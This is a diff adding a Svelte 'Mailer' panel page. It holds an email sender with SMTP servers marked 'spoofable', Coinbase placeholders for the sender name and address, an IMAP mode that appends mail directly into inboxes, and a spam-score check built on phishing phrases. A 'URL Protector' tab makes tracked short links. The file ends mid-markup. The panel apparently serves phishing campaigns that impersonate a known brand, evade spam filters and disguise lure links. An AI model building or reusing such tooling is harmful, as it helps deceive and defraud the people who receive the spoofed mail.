@@ -1,0 +1,950 @@
+<script lang="ts">
+	import { onMount } from 'svelte';
+	import {
+		Mail,
+		Send,
+		Plus,
+		Trash2,
+		FileText,
+		Server,
+		Eye,
+		Code,
+		X,
+		CheckCircle,
+		AlertCircle,
+		Loader,
+		ShieldCheck,
+		ShieldAlert,
+		TriangleAlert,
+		Info,
+		Save,
+		Bookmark,
+		Link as LinkIcon,
+		Copy,
+		Check,
+		ExternalLink,
+		ToggleLeft,
+		ToggleRight,
+		RefreshCw,
+		Search,
+		BarChart3,
+		Activity,
+		Globe,
+		Monitor,
+		Smartphone
+	} from 'lucide-svelte';
+	import { sendMessage, mailerResult } from '$lib/stores/websocket';
+	import { toast } from '$lib/stores/toast';
+
+	interface SmtpServer {
+		id: string;
+		host: string;
+		port: number;
+		user: string;
+		password: string;
+		active: boolean;
+		useSSL: boolean;
+		spoofable: boolean;
+	}
+	interface Template {
+		id: string;
+		slug: string;
+		name: string;
+		subject: string;
+		html: string;
+		variables: string[];
+		ownerUsername: string;
+		shared: boolean;
+	}
+	interface Preset {
+		id: string;
+		name: string;
+		smtpId: string;
+		templateSlug: string;
+		senderName: string;
+		senderEmail: string;
+		replyTo: string;
+		subject: string;
+		sendMode: 'smtp' | 'mail-server';
+	}
+	interface ProtectedUrl {
+		id: string;
+		shortCode: string;
+		originalUrl: string;
+		domain: string;
+		clicks: number;
+		status: 'active' | 'inactive';
+		createdAt: number;
+		expiresAt: number;
+	}
+
+	let activeTab = $state<'sender' | 'protector'>('sender');
+
+	// Sender state
+	let templates: Template[] = $state([]);
+	let smtpServers: SmtpServer[] = $state([]);
+	let presets: Preset[] = $state([]);
+	let selectedSmtp = $state('');
+	let recipientList = $state('');
+	let selectedTemplateId = $state<string>('');
+	let customSubject = $state('');
+	let senderEmail = $state('');
+	let senderName = $state('');
+	let replyTo = $state('');
+	let fullAccessMode = $state(false);
+	let sendMode = $state<'smtp' | 'mail-server'>('smtp');
+	let editingTemplate = $state(false);
+	let showAddSmtp = $state(false);
+	let showSavePreset = $state(false);
+	let presetName = $state('');
+	let presetMenuOpen = $state(false);
+	let previewMode = $state<'desktop' | 'mobile'>('desktop');
+
+	// SMTP modal state
+	let newSmtpHost = $state('');
+	let newSmtpPort = $state('465');
+	let newSmtpUser = $state('');
+	let newSmtpPass = $state('');
+	let newSmtpSSL = $state(false);
+	let newSmtpSpoofable = $state(false);
+
+	let sending = $state(false);
+	let sendStatus: { type: 'success' | 'error'; message: string } | null = $state(null);
+	let variableValues: Record<string, string> = $state({});
+
+	let currentTemplate = $derived(templates.find((t) => t.id === selectedTemplateId));
+
+	function getFilledHtml(html: string): string {
+		let result = html;
+		for (const [key, value] of Object.entries(variableValues)) {
+			if (value) result = result.replaceAll(key, value);
+		}
+		return result;
+	}
+
+	let previewHtml = $derived(
+		currentTemplate
+			? getFilledHtml(currentTemplate.html)
+			: '<p style="color:#888;text-align:center;padding:40px;">Select a template to preview</p>'
+	);
+
+	function cleanVariableName(v: string): string {
+		return v.replace(/^\{\{\s*/, '').replace(/\s*\}\}$/, '');
+	}
+
+	mailerResult.subscribe((result) => {
+		if (!result) return;
+		sending = false;
+		if (result.failed === 0) {
+			sendStatus = { type: 'success', message: `Sent ${result.sent}/${result.total} emails successfully` };
+		} else if (result.sent > 0) {
+			sendStatus = { type: 'error', message: `${result.sent} sent, ${result.failed} failed: ${result.errors[0]}` };
+		} else {
+			sendStatus = { type: 'error', message: result.errors[0] || 'All emails failed to send' };
+		}
+		setTimeout(() => { sendStatus = null; }, 8000);
+	});
+
+	async function fetchTemplates() {
+		const res = await fetch('/api/templates');
+		if (res.ok) {
+			const data = await res.json();
+			templates = data.templates;
+		}
+	}
+
+	async function fetchPresets() {
+		const res = await fetch('/api/mailer-presets');
+		if (res.ok) {
+			const data = await res.json();
+			presets = data.presets;
+		}
+	}
+
+	async function fetchProtectedUrls() {
+		const res = await fetch('/api/protected-urls');
+		if (res.ok) {
+			const data = await res.json();
+			urls = data.urls;
+			urlStats = data.stats;
+		}
+	}
+
+	onMount(() => {
+		fetchTemplates();
+		fetchPresets();
+		fetchProtectedUrls();
+	});
+
+	function sendCampaign() {
+		const recipients = recipientList.split('\n').map((r) => r.trim()).filter(Boolean);
+		if (!currentTemplate) return;
+		if (!fullAccessMode && recipients.length === 0) return;
+		if (!selectedSmtp) return;
+
+		sending = true;
+		sendStatus = null;
+
+		const filledHtml = getFilledHtml(currentTemplate.html);
+		const filledSubject = getFilledHtml(customSubject || currentTemplate.subject || '');
+
+		sendMessage('mailer:send', {
+			templateId: currentTemplate.slug,
+			recipients,
+			subject: filledSubject,
+			html: filledHtml,
+			senderEmail: senderEmail || undefined,
+			senderName: senderName || undefined,
+			replyTo: replyTo || undefined,
+			smtpId: selectedSmtp || undefined,
+			fullAccess: fullAccessMode,
+			sendMode
+		});
+	}
+
+	function addSmtp() {
+		if (!newSmtpHost.trim() || !newSmtpUser.trim()) return;
+		const smtp: SmtpServer = {
+			id: crypto.randomUUID(),
+			host: newSmtpHost.trim(),
+			port: parseInt(newSmtpPort),
+			user: newSmtpUser.trim(),
+			password: newSmtpPass,
+			active: true,
+			useSSL: newSmtpSSL,
+			spoofable: newSmtpSpoofable
+		};
+		smtpServers = [...smtpServers, smtp];
+		if (!selectedSmtp) selectedSmtp = smtp.id;
+		sendMessage('mailer:smtp:add', { id: smtp.id, host: smtp.host, port: smtp.port, user: smtp.user, password: smtp.password, useSSL: smtp.useSSL, spoofable: smtp.spoofable });
+		newSmtpHost = '';
+		newSmtpPort = '465';
+		newSmtpUser = '';
+		newSmtpPass = '';
+		newSmtpSSL = false;
+		newSmtpSpoofable = false;
+		showAddSmtp = false;
+	}
+
+	function removeSmtp(id: string) {
+		smtpServers = smtpServers.filter((s) => s.id !== id);
+		sendMessage('mailer:smtp:remove', { id });
+	}
+
+	async function savePreset() {
+		if (!presetName.trim()) return;
+		const res = await fetch('/api/mailer-presets', {
+			method: 'POST',
+			headers: { 'Content-Type': 'application/json' },
+			body: JSON.stringify({
+				name: presetName,
+				smtpId: selectedSmtp,
+				templateSlug: currentTemplate?.slug || '',
+				senderName,
+				senderEmail,
+				replyTo,
+				subject: customSubject,
+				sendMode
+			})
+		});
+		if (res.ok) {
+			await fetchPresets();
+			showSavePreset = false;
+			presetName = '';
+		}
+	}
+
+	async function deletePreset(p: Preset) {
+		await fetch(`/api/mailer-presets/${p.id}`, { method: 'DELETE' });
+		await fetchPresets();
+	}
+
+	function loadPreset(p: Preset) {
+		selectedSmtp = p.smtpId;
+		const tmpl = templates.find((t) => t.slug === p.templateSlug);
+		if (tmpl) selectedTemplateId = tmpl.id;
+		senderName = p.senderName;
+		senderEmail = p.senderEmail;
+		replyTo = p.replyTo;
+		customSubject = p.subject;
+		sendMode = p.sendMode;
+		presetMenuOpen = false;
+	}
+
+	function clearForm() {
+		recipientList = '';
+		customSubject = '';
+		senderEmail = '';
+		senderName = '';
+		replyTo = '';
+		variableValues = {};
+		selectedTemplateId = '';
+	}
+
+	// --- Spam analysis (kept from previous version) ---
+	const SPAM_TRIGGER_WORDS = [
+		'urgent', 'act now', 'action required', 'immediate', 'limited time',
+		'expires', 'last chance', 'don\'t miss', 'hurry', 'order now',
+		'click here', 'click below', 'buy now', 'free', 'winner',
+		'congratulations', 'you\'ve won', 'prize', 'guaranteed', 'no risk',
+		'risk-free', 'no obligation', '100%', 'cash', 'earn money',
+		'make money', 'extra income', 'financial freedom', 'investment',
+		'double your', 'million', 'billion', 'pure profit',
+		'apply now', 'call now', 'deal', 'discount', 'offer',
+		'lowest price', 'affordable', 'bargain', 'bonus',
+		'dear friend', 'dear customer', 'important notice',
+		'verify your account', 'confirm your identity', 'suspended',
+		'unauthorized', 'security alert', 'unusual activity',
+		'password expired', 'account locked', 'billing problem'
+	];
+
+	interface SpamWarning {
+		severity: 'critical' | 'warning' | 'info';
+		field: string;
+		message: string;
+	}
+
+	function analyzeSpam(subject: string, name: string, email: string): SpamWarning[] {
+		const w: SpamWarning[] = [];
+		const sub = (subject || currentTemplate?.subject || '').toLowerCase();
+		for (const word of SPAM_TRIGGER_WORDS) {
+			if (sub.includes(word)) {
+				w.push({ severity: 'warning', field: 'Subject', message: `Contains "${word}"` });
+			}
+		}
+		if (subject && subject === subject.toUpperCase() && subject.length > 3) {
+			w.push({ severity: 'critical', field: 'Subject', message: 'Subject is ALL CAPS' });
+		}
+		const exclamations = (subject.match(/!/g) || []).length;
+		if (exclamations > 1) {
+			w.push({ severity: 'warning', field: 'Subject', message: `${exclamations} exclamation marks` });
+		}
+		if (subject.startsWith('Re:') || subject.startsWith('Fwd:')) {
+			w.push({ severity: 'critical', field: 'Subject', message: 'Fake reply/forward prefix' });
+		}
+		if (email && (email.includes('noreply') || email.includes('no-reply'))) {
+			w.push({ severity: 'info', field: 'Sender Email', message: 'Using a no-reply address' });
+		}
+		return w;
+	}
+
+	let spamWarnings = $derived(analyzeSpam(customSubject, senderName, senderEmail));
+	let spamScore = $derived(() => {
+		let s = 100;
+		for (const w of spamWarnings) {
+			if (w.severity === 'critical') s -= 25;
+			else if (w.severity === 'warning') s -= 10;
+			else s -= 3;
+		}
+		return Math.max(0, s);
+	});
+
+	// --- URL Protector state ---
+	let urls: ProtectedUrl[] = $state([]);
+	let urlStats = $state<{ total: number; clicks: number; active: number }>({ total: 0, clicks: 0, active: 0 });
+	let urlSearch = $state('');
+	let showAddUrl = $state(false);
+	let newUrlOriginal = $state('');
+	let newUrlDomain = $state('');
+	let newUrlExpires = $state('');
+	let copiedShort = $state<string | null>(null);
+
+	let filteredUrls = $derived(
+		urls.filter((u) => {
+			if (!urlSearch.trim()) return true;
+			const q = urlSearch.toLowerCase();
+			return u.shortCode.toLowerCase().includes(q) || u.originalUrl.toLowerCase().includes(q);
+		})
+	);
+
+	function shortLink(u: ProtectedUrl): string {
+		const origin = typeof window !== 'undefined' ? window.location.origin : '';
+		return `${origin}/u/${u.shortCode}`;
+	}
+
+	function copyShort(u: ProtectedUrl) {
+		navigator.clipboard?.writeText(shortLink(u));
+		copiedShort = u.id;
+		toast.success('Short link copied to clipboard');
+		setTimeout(() => (copiedShort = null), 1200);
+	}
+
+	async function addUrl() {
+		if (!newUrlOriginal.trim()) return;
+		const expires = parseInt(newUrlExpires, 10);
+		const res = await fetch('/api/protected-urls', {
+			method: 'POST',
+			headers: { 'Content-Type': 'application/json' },
+			body: JSON.stringify({
+				originalUrl: newUrlOriginal.trim(),
+				domain: newUrlDomain.trim(),
+				expiresInSeconds: Number.isFinite(expires) && expires > 0 ? expires : 0
+			})
+		});
+		if (res.ok) {
+			newUrlOriginal = '';
+			newUrlDomain = '';
+			newUrlExpires = '';
+			showAddUrl = false;
+			await fetchProtectedUrls();
+		}
+	}
+
+	async function toggleUrl(u: ProtectedUrl) {
+		const next = u.status === 'active' ? 'inactive' : 'active';
+		await fetch(`/api/protected-urls/${u.id}`, {
+			method: 'PATCH',
+			headers: { 'Content-Type': 'application/json' },
+			body: JSON.stringify({ status: next })
+		});
+		await fetchProtectedUrls();
+	}
+
+	async function deleteUrl(u: ProtectedUrl) {
+		if (!confirm(`Delete short link /${u.shortCode}?`)) return;
+		await fetch(`/api/protected-urls/${u.id}`, { method: 'DELETE' });
+		await fetchProtectedUrls();
+	}
+
+	function fmtDate(ts: number) {
+		if (!ts) return '—';
+		try { return new Date(ts).toLocaleDateString(); } catch { return '—'; }
+	}
+</script>
+
+<svelte:head>
+	<title>Mailer · Panel</title>
+</svelte:head>
+
+<div class="p-8 pt-5">
+	<div class="mb-5 flex items-start justify-between gap-3">
+		<div>
+			<h1 class="text-2xl font-bold text-[var(--foreground)]">Mailer</h1>
+			<p class="mt-1 text-sm text-[var(--muted-foreground)]">Send emails, manage SMTP servers, and protect URLs</p>
+		</div>
+	</div>
+
+	<!-- Tabs -->
+	<div class="mb-5 flex items-center gap-1 rounded-xl border border-[var(--border)] bg-[var(--card)] p-1 w-fit">
+		<button
+			onclick={() => (activeTab = 'sender')}
+			class="flex items-center gap-2 rounded-lg px-4 py-2 text-xs transition-soft {activeTab === 'sender' ? 'bg-[var(--accent-primary)]/15 text-[var(--text-accent)]' : 'text-[var(--muted-foreground)] hover:bg-[var(--accent)]'}"
+		>
+			<Mail size={13} />
+			Email Sender
+		</button>
+		<button
+			onclick={() => (activeTab = 'protector')}
+			class="flex items-center gap-2 rounded-lg px-4 py-2 text-xs transition-soft {activeTab === 'protector' ? 'bg-[var(--accent-primary)]/15 text-[var(--text-accent)]' : 'text-[var(--muted-foreground)] hover:bg-[var(--accent)]'}"
+		>
+			<LinkIcon size={13} />
+			URL Protector
+		</button>
+	</div>
+
+	{#if activeTab === 'sender'}
+		<!-- ============= EMAIL SENDER ============= -->
+		<div class="grid gap-4 xl:grid-cols-12">
+			<!-- LEFT: compose + preview -->
+			<div class="xl:col-span-7 space-y-4">
+				<!-- Top action bar -->
+				<div class="flex flex-wrap items-center justify-between gap-2 rounded-xl border border-[var(--border)] bg-[var(--card)] px-4 py-2.5">
+					<div class="flex items-center gap-2">
+						<button onclick={clearForm} class="flex items-center gap-1.5 rounded-lg border border-[var(--border)] px-3 py-1.5 text-xs text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)] hover:text-[var(--foreground)]">
+							<X size={11} />
+							Clear
+						</button>
+						<button onclick={() => (showSavePreset = true)} class="flex items-center gap-1.5 rounded-lg border border-[var(--border)] px-3 py-1.5 text-xs text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)] hover:text-[var(--foreground)]">
+							<Bookmark size={11} />
+							Save as Preset
+						</button>
+						<div class="relative">
+							<button onclick={() => (presetMenuOpen = !presetMenuOpen)} class="flex items-center gap-1.5 rounded-lg border border-[var(--border)] px-3 py-1.5 text-xs text-[var(--muted-foreground)] transition-soft hover:bg-[var(--accent)] hover:text-[var(--foreground)]">
+								<FileText size={11} />
+								Load Preset
+								{#if presets.length > 0}
+									<span class="ml-1 rounded bg-[var(--accent-primary)]/10 px-1.5 py-0.5 text-[10px] font-bold text-[var(--text-accent)]">{presets.length}</span>
+								{/if}
+							</button>
+							{#if presetMenuOpen}
+								<div class="absolute right-0 top-full z-30 mt-1 w-72 rounded-lg border border-[var(--border)] bg-[var(--card)] py-1 shadow-2xl">
+									{#if presets.length === 0}
+										<p class="px-4 py-3 text-xs text-[var(--muted-foreground)]">No saved presets yet.</p>
+									{:else}
+										{#each presets as p (p.id)}
+											<div class="group flex items-center justify-between gap-2 px-3 py-2 hover:bg-[var(--accent)]/30">
+												<button onclick={() => loadPreset(p)} class="flex-1 truncate text-left text-xs text-[var(--foreground)]">
+													<p class="truncate font-medium">{p.name}</p>
+													<p class="truncate text-[10px] text-[var(--muted-foreground)]">{p.senderEmail || 'no sender'}</p>
+												</button>
+												<button onclick={() => deletePreset(p)} class="opacity-0 group-hover:opacity-100 rounded p-1 text-[var(--muted-foreground)] hover:bg-[var(--destructive)]/15 hover:text-[var(--destructive)]" aria-label="Delete preset">
+													<Trash2 size={11} />
+												</button>
+											</div>
+										{/each}
+									{/if}
+								</div>
+							{/if}
+						</div>
+					</div>
+
+					<div class="flex items-center gap-2">
+						<button
+							onclick={() => (fullAccessMode = !fullAccessMode)}
+							class="flex items-center gap-1.5 rounded-lg border px-3 py-1.5 text-xs transition-soft {fullAccessMode ? 'border-[var(--status-live)]/30 bg-[var(--status-live)]/10 text-[var(--status-live)]' : 'border-[var(--border)] text-[var(--muted-foreground)] hover:bg-[var(--accent)]'}"
+						>
+							{#if fullAccessMode}<ToggleRight size={12} />{:else}<ToggleLeft size={12} />{/if}
+							Full Access (IMAP)
+						</button>
+					</div>
+				</div>
+
+				<!-- Send-mode toggle -->
+				<div class="flex items-center gap-2 rounded-xl border border-[var(--border)] bg-[var(--card)] p-2 w-fit">
+					<button
+						onclick={() => (sendMode = 'smtp')}
+						class="rounded-md px-3 py-1.5 text-xs {sendMode === 'smtp' ? 'bg-[var(--accent-primary)]/15 text-[var(--text-accent)]' : 'text-[var(--muted-foreground)]'}"
+					>
+						Custom SMTP
+					</button>
+					<button
+						onclick={() => (sendMode = 'mail-server')}
+						class="rounded-md px-3 py-1.5 text-xs {sendMode === 'mail-server' ? 'bg-[var(--accent-primary)]/15 text-[var(--text-accent)]' : 'text-[var(--muted-foreground)]'}"
+					>
+						Mail Server
+					</button>
+				</div>
+
+				<!-- Compose card -->
+				<div class="rounded-xl border border-[var(--border)] bg-[var(--card)] overflow-hidden" style="box-shadow: var(--shadow-sm);">
+					<div class="border-b border-[var(--border)] px-4 py-3 flex items-center gap-2">
+						<Mail size={14} class="text-[var(--text-accent)]" />
+						<p class="text-sm font-semibold text-[var(--foreground)]">Email Configuration</p>
+					</div>
+					<div class="p-4 space-y-3">
+						<div class="grid grid-cols-2 gap-3">
+							<div>
+								<label class="mb-1 block text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">{sendMode === 'smtp' ? 'SMTP Configuration' : 'Mail Server'}</label>
+								<select bind:value={selectedSmtp} class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-xs text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none">
+									<option value="">Select SMTP configuration...</option>
+									{#each smtpServers as smtp}
+										<option value={smtp.id}>{smtp.user}@{smtp.host}</option>
+									{/each}
+								</select>
+							</div>
+							<div>
+								<div class="mb-1 flex items-center justify-between">
+									<label for="mailer-template-select" class="block text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">
+										Email Template
+									</label>
+									{#if selectedTemplateId}
+										<button
+											onclick={() => (editingTemplate = !editingTemplate)}
+											aria-label="Edit template HTML inline"
+											aria-pressed={editingTemplate}
+											title={editingTemplate ? 'Close inline editor' : 'Edit HTML inline'}
+											class="flex items-center gap-1 rounded px-1.5 py-0.5 text-[10px] text-[var(--text-accent)] transition-soft hover:bg-[var(--accent)]"
+										>
+											<Code size={10} />
+											{editingTemplate ? 'Done' : 'Edit HTML'}
+										</button>
+									{/if}
+								</div>
+								<select id="mailer-template-select" bind:value={selectedTemplateId} class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-xs text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none">
+									<option value="">Select template...</option>
+									{#each templates as t}
+										<option value={t.id}>{t.name}{t.shared ? ' (shared)' : ''}</option>
+									{/each}
+								</select>
+							</div>
+						</div>
+					</div>
+				</div>
+
+				<!-- Email details card -->
+				<div class="rounded-xl border border-[var(--border)] bg-[var(--card)] overflow-hidden" style="box-shadow: var(--shadow-sm);">
+					<div class="border-b border-[var(--border)] px-4 py-3 flex items-center gap-2">
+						<Send size={14} class="text-[var(--text-accent)]" />
+						<p class="text-sm font-semibold text-[var(--foreground)]">Email Details</p>
+					</div>
+					<div class="p-4 space-y-3">
+						{#if !fullAccessMode}
+							<div>
+								<label class="mb-1 block text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">To <span class="text-red-400">*</span></label>
+								<textarea bind:value={recipientList} rows={2} placeholder="recipient@example.com" class="w-full resize-y rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-xs text-[var(--foreground)] placeholder:text-[var(--text-tertiary)] focus:border-[var(--accent-primary)] focus:outline-none"></textarea>
+							</div>
+						{/if}
+						<div>
+							<label class="mb-1 block text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">Subject <span class="text-red-400">*</span></label>
+							<input bind:value={customSubject} type="text" placeholder={currentTemplate?.subject || 'Email subject line'} class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-xs text-[var(--foreground)] placeholder:text-[var(--text-tertiary)] focus:border-[var(--accent-primary)] focus:outline-none" />
+						</div>
+						<div class="grid grid-cols-2 gap-3">
+							<div>
+								<label class="mb-1 block text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">Sender Name</label>
+								<input bind:value={senderName} type="text" placeholder="Coinbase" class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-xs text-[var(--foreground)] placeholder:text-[var(--text-tertiary)] focus:border-[var(--accent-primary)] focus:outline-none" />
+							</div>
+							<div>
+								<label class="mb-1 block text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">Sender Email</label>
+								<input bind:value={senderEmail} type="email" placeholder="no-reply@coinbase.com" class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-xs text-[var(--foreground)] placeholder:text-[var(--text-tertiary)] focus:border-[var(--accent-primary)] focus:outline-none" />
+							</div>
+						</div>
+						<div>
+							<label class="mb-1 block text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">Reply-To Email</label>
+							<input bind:value={replyTo} type="email" placeholder="reply@company.com" class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 text-xs text-[var(--foreground)] placeholder:text-[var(--text-tertiary)] focus:border-[var(--accent-primary)] focus:outline-none" />
+						</div>
+
+						{#if currentTemplate && currentTemplate.variables.length > 0}
+							<div class="rounded-md border border-[var(--border)] bg-[var(--input)]/30 p-3">
+								<p class="mb-2 text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">Template Variables</p>
+								<div class="grid grid-cols-2 gap-2">
+									{#each currentTemplate.variables as v}
+										<div>
+											<label class="mb-0.5 block text-[10px] text-[var(--foreground)]">{cleanVariableName(v)}</label>
+											<input
+												type="text"
+												placeholder={cleanVariableName(v)}
+												value={variableValues[v] || ''}
+												oninput={(e) => { variableValues[v] = (e.target as HTMLInputElement).value; variableValues = { ...variableValues }; }}
+												class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-2 py-1.5 text-[11px] text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none"
+											/>
+										</div>
+									{/each}
+								</div>
+							</div>
+						{/if}
+
+						{#if editingTemplate && currentTemplate}
+							<div>
+								<label class="mb-1 block text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">Template HTML (inline edit)</label>
+								<textarea
+									value={currentTemplate.html}
+									oninput={(e) => {
+										const html = (e.target as HTMLTextAreaElement).value;
+										const idx = templates.findIndex((t) => t.id === selectedTemplateId);
+										if (idx !== -1) {
+											templates[idx] = { ...templates[idx], html };
+											templates = [...templates];
+										}
+									}}
+									rows={8}
+									class="w-full resize-y rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 font-mono text-[11px] text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none"
+								></textarea>
+							</div>
+						{/if}
+
+						<!-- Spam summary (collapsed for brevity) -->
+						{#if customSubject || senderName || senderEmail}
+							<div class="flex items-center gap-2 rounded-md border border-[var(--border)] px-3 py-2">
+								{#if spamScore() >= 80}
+									<ShieldCheck size={14} class="text-[var(--status-live)]" />
+								{:else if spamScore() >= 50}
+									<ShieldAlert size={14} class="text-amber-400" />
+								{:else}
+									<ShieldAlert size={14} class="text-[var(--destructive)]" />
+								{/if}
+								<span class="text-xs font-medium text-[var(--foreground)]">Spam Score: {spamScore()}/100</span>
+								<span class="ml-auto text-[10px] text-[var(--muted-foreground)]">
+									{spamWarnings.length === 0 ? 'Looks good' : `${spamWarnings.length} ${spamWarnings.length === 1 ? 'issue' : 'issues'}`}
+								</span>
+							</div>
+						{/if}
+
+						{#if sendStatus}
+							<div class="flex items-center gap-2 rounded-md px-3 py-2 text-xs {sendStatus.type === 'success' ? 'bg-[var(--status-live)]/15 text-[var(--status-live)]' : 'bg-[var(--destructive)]/15 text-[var(--destructive)]'}">
+								{#if sendStatus.type === 'success'}<CheckCircle size={13} />{:else}<AlertCircle size={13} />{/if}
+								{sendStatus.message}
+							</div>
+						{/if}
+
+						<button
+							onclick={sendCampaign}
+							disabled={sending || !selectedSmtp || !currentTemplate || smtpServers.length === 0}
+							class="btn-accent flex w-full items-center justify-center gap-2 rounded-md px-4 py-2.5 text-xs disabled:opacity-50 disabled:cursor-not-allowed"
+						>
+							{#if sending}
+								<Loader size={13} class="animate-spin" />
+								Sending...
+							{:else}
+								<Send size={13} />
+								{fullAccessMode ? 'Append to inbox' : 'Send Email'}
+							{/if}
+						</button>
+						{#if smtpServers.length === 0}
+							<p class="text-center text-[10px] text-[var(--muted-foreground)]">Add an SMTP server first to send emails →</p>
+						{/if}
+					</div>
+				</div>
+			</div>
+
+			<!-- RIGHT: preview + smtp -->
+			<div class="xl:col-span-5 space-y-4">
+				<!-- Live preview -->
+				<div class="rounded-xl border border-[var(--border)] bg-[var(--card)] overflow-hidden" style="box-shadow: var(--shadow-sm);">
+					<div class="border-b border-[var(--border)] px-4 py-3 flex items-center justify-between">
+						<div class="flex items-center gap-2">
+							<Eye size={14} class="text-[var(--text-accent)]" />
+							<p class="text-sm font-semibold text-[var(--foreground)]">Live Preview</p>
+						</div>
+						<div class="flex items-center gap-1 rounded-md border border-[var(--border)] p-0.5">
+							<button onclick={() => (previewMode = 'desktop')} class="flex items-center gap-1 rounded px-2 py-1 text-[10px] {previewMode === 'desktop' ? 'bg-[var(--accent-primary)]/15 text-[var(--text-accent)]' : 'text-[var(--muted-foreground)]'}">
+								<Monitor size={10} />
+								Desktop
+							</button>
+							<button onclick={() => (previewMode = 'mobile')} class="flex items-center gap-1 rounded px-2 py-1 text-[10px] {previewMode === 'mobile' ? 'bg-[var(--accent-primary)]/15 text-[var(--text-accent)]' : 'text-[var(--muted-foreground)]'}">
+								<Smartphone size={10} />
+								Mobile
+							</button>
+						</div>
+					</div>
+					<!-- From/Subject preview row -->
+					<div class="border-b border-[var(--border-subtle)] bg-[var(--input)]/30 px-4 py-2 text-[11px]">
+						<p class="text-[var(--muted-foreground)]">
+							<span class="text-[var(--foreground)] font-medium">From:</span> {senderName || 'Sender'} &lt;{senderEmail || 'sender@example.com'}&gt;
+						</p>
+						<p class="text-[var(--muted-foreground)]">
+							<span class="text-[var(--foreground)] font-medium">Subject:</span> {customSubject || currentTemplate?.subject || '(no subject)'}
+						</p>
+						{#if replyTo}
+							<p class="text-[var(--muted-foreground)]">
+								<span class="text-[var(--foreground)] font-medium">Reply-To:</span> {replyTo}
+							</p>
+						{/if}
+					</div>
+					<div class="bg-white" style="height: 480px;">
+						<div class="h-full w-full {previewMode === 'mobile' ? 'flex items-center justify-center bg-zinc-100' : ''}">
+							<iframe srcdoc={previewHtml} title="Email Preview" class="border-0 {previewMode === 'mobile' ? 'h-[420px] w-[300px] shadow-xl' : 'h-full w-full'}" sandbox="allow-same-origin"></iframe>
+						</div>
+					</div>
+				</div>
+
+				<!-- SMTP servers -->
+				<div class="rounded-xl border border-[var(--border)] bg-[var(--card)] overflow-hidden" style="box-shadow: var(--shadow-sm);">
+					<div class="border-b border-[var(--border)] px-4 py-3 flex items-center justify-between">
+						<div class="flex items-center gap-2">
+							<Server size={14} class="text-[var(--text-accent)]" />
+							<p class="text-sm font-semibold text-[var(--foreground)]">SMTP Servers</p>
+						</div>
+						<button onclick={() => (showAddSmtp = true)} class="rounded-md p-1.5 text-[var(--text-accent)] hover:bg-[var(--accent-primary)]/15" aria-label="Add SMTP">
+							<Plus size={12} />
+						</button>
+					</div>
+					<div class="max-h-[200px] overflow-y-auto custom-scrollbar divide-y divide-[var(--border-subtle)]">
+						{#each smtpServers as smtp (smtp.id)}
+							<div class="flex items-center justify-between p-3 hover:bg-[var(--accent)]/30">
+								<div>
+									<p class="font-mono text-xs font-semibold text-[var(--foreground)]">{smtp.host}:{smtp.port}</p>
+									<p class="text-[10px] text-[var(--muted-foreground)]">{smtp.user}{smtp.useSSL ? ' · SSL' : ''}{smtp.spoofable ? ' · spoofable' : ''}</p>
+								</div>
+								<button onclick={() => removeSmtp(smtp.id)} class="rounded-md p-1.5 text-[var(--muted-foreground)] hover:bg-[var(--destructive)]/10 hover:text-[var(--destructive)]" aria-label="Remove SMTP">
+									<Trash2 size={11} />
+								</button>
+							</div>
+						{/each}
+						{#if smtpServers.length === 0}
+							<p class="px-3 py-6 text-center text-xs text-[var(--muted-foreground)]">No SMTP servers configured</p>
+						{/if}
+					</div>
+				</div>
+			</div>
+		</div>
+	{:else}
+		<!-- ============= URL PROTECTOR ============= -->
+		<div class="space-y-4">
+			<!-- Stat cards -->
+			<div class="grid grid-cols-1 gap-3 sm:grid-cols-3">
+				<div class="rounded-xl border border-[var(--border)] bg-[var(--card)] p-4">
+					<div class="flex items-center justify-between">
+						<p class="text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">Your URLs</p>
+						<div class="flex h-7 w-7 items-center justify-center rounded-md bg-[var(--accent-primary)]/10 text-[var(--text-accent)]">
+							<LinkIcon size={13} />
+						</div>
+					</div>
+					<p class="mt-2 text-2xl font-bold text-[var(--foreground)]">{urlStats.total}</p>
+					<p class="text-[10px] text-[var(--muted-foreground)]">Personal URLs created</p>
+				</div>
+				<div class="rounded-xl border border-[var(--border)] bg-[var(--card)] p-4">
+					<div class="flex items-center justify-between">
+						<p class="text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">Your Clicks</p>
+						<div class="flex h-7 w-7 items-center justify-center rounded-md bg-cyan-500/10 text-cyan-300">
+							<BarChart3 size={13} />
+						</div>
+					</div>
+					<p class="mt-2 text-2xl font-bold text-[var(--foreground)]">{urlStats.clicks}</p>
+					<p class="text-[10px] text-[var(--muted-foreground)]">Clicks on your URLs</p>
+				</div>
+				<div class="rounded-xl border border-[var(--border)] bg-[var(--card)] p-4">
+					<div class="flex items-center justify-between">
+						<p class="text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">Your Active</p>
+						<div class="flex h-7 w-7 items-center justify-center rounded-md bg-emerald-500/10 text-emerald-300">
+							<Activity size={13} />
+						</div>
+					</div>
